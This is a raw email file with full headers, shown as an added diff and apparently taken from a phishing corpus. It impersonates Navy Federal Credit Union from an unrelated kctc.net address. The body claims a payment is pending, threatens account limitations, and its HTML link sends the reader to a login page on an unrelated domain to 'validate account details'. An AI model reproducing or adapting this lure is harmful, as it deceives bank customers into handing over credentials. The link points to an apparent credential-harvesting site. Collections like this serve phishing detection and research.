@@ -1,0 +1,93 @@
+Return-Path: <navyfederal2@kctc.net>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 0BBD6F40B8
+	for <jose@login.monkey.org>; Tue, 28 Apr 2015 08:20:49 -0500 (CDT)
+Received: from smtpin08.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 682D334E389
+	for <jose@login.monkey.org>; Tue, 28 Apr 2015 13:20:48 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70127506176.08.push55_240612b9ee247
+Authentication-Results: auth.b.hostedemail.com; dmarc=none header.from=kctc.net
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 77,5.5,0,66d7711ce1138dc6,d41d8cd98f00b204,navyfederal2@kctc.net,:navyfederal2@kctc.net,RULES_HIT:41:72:196:379:962:967:973:979:983:988:989:1189:1208:1221:1254:1260:1263:1313:1314:1381:1431:1437:1516:1517:1518:1534:1540:1575:1589:1594:1622:1711:1714:1730:1777:1792:2525:2553:2560:2563:2610:2682:2685:2693:2859:2890:2894:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3350:3392:3623:3690:3867:3870:3871:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4362:4383:5007:6261:6678:6687:7652:8599:8987:9025:9388:9416:9873:9908:10011:10049:10214:10400:11658:11914:12043:12050:12051:12219:12561:12679:12764:13180:13229:13235:13237:13868:13898:13975:14036:14096:14516:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fs,MSBL:0,DNSBL:neutral,Custom_rules:0:2:0
+X-HE-Tag: push55_240612b9ee247
+X-Filterd-Recvd-Size: 2865
+Received: from cmta12.telus.net (cmta12.telus.net [209.171.16.85])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Tue, 28 Apr 2015 13:20:47 +0000 (UTC)
+Received: from [172.20.10.3] ([96.1.32.103])
+	by cmta12.telus.net with TELUS
+	id MRHh1q00P2DVxRs01RKwgF; Tue, 28 Apr 2015 07:20:47 -0600
+X-Authority-Analysis: v=2.0 cv=AoUwKpBP c=1 sm=2
+ a=n0B9Q0onC45Og5O5rzwA6w==:17 a=xrR7RPhFAAAA:8 a=e0mG1wKg8N-zJ8D6jN0A:9
+ a=wPNLvfGTeEIA:10 a=jgexKv3jcIQX2Ms3:21 a=Q62sVZXFSQ3PyNUD:21
+ a=Q2heh-cZAAAA:8 a=A6PDMd2IWO74K7YHEdAA:9 a=_W_S_7VecoQA:10 a=PHph4T0LT1EA:10
+ a=-FEs8UIgK8oA:10 a=NWVoK91CQyQA:10 a=9C_hRJV7IXtrrpkr:21
+ a=n0B9Q0onC45Og5O5rzwA6w==:117
+X-Telus-Outbound-IP: 96.1.32.103
+Content-Type: multipart/alternative; boundary="===============0169330562=="
+MIME-Version: 1.0
+Subject: There is a payment pending on your Navy Federal Account.
+To: Recipients <navyfederal2@kctc.net>
+From: "Navy Federal" <navyfederal2@kctc.net>
+Date: Tue, 28 Apr 2015 14:19:20 +0100
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 73
+
+You will not see this in a MIME-aware mail reader.
+--===============0169330562==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Security Alert: There is a payment pending on your Navy Federal Account.
+ =
+
+This email is to notify you that there is a payment pending on your Navy Fe=
+deral Account.
+ =
+
+Pending payment will be debited into your account with in 48 to 72 hours af=
+ter your approval.
+ =
+
+Logon here to approve.
+ =
+
+Note: Please validate your account details to fully complete this approval.=
+ If we don't hear from you, =
+
+unfortunately certain limitations may be placed on your accounts.
+ =
+
+Thank you,
+ Navy Federal Credit Union
+
+--===============0169330562==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><BODY><P><FONT face=3DVerdana>Security Alert: There is a payment pend=
+ing on your Navy Federal Account.</FONT></P>
+<P><BR><FONT face=3DVerdana>This email is to notify you that there is a pay=
+ment pending on your Navy Federal Account.</FONT></P>
+<P><BR><FONT face=3DVerdana>Pending payment will be debited into your accou=
+nt with in 48 to 72 hours after your approval.</FONT></P>
+<P><BR><A href=3D"http://dansouthern.info/pdfs/lpa/index.php"><FONT face=3D=
+Verdana>Logon here to approve.</FONT></A></P>
+<P><BR><FONT face=3DVerdana>Note: Please validate your account details to f=
+ully complete this approval. If we don't hear from you, <BR>unfortunately c=
+ertain limitations may be placed on your accounts.</FONT></P>
+<P><BR><FONT face=3DVerdana>Thank you,</FONT></P>
+<P><FONT face=3DVerdana>Navy Federal Credit Union</FONT></P></BODY></HTML>
+--===============0169330562==--
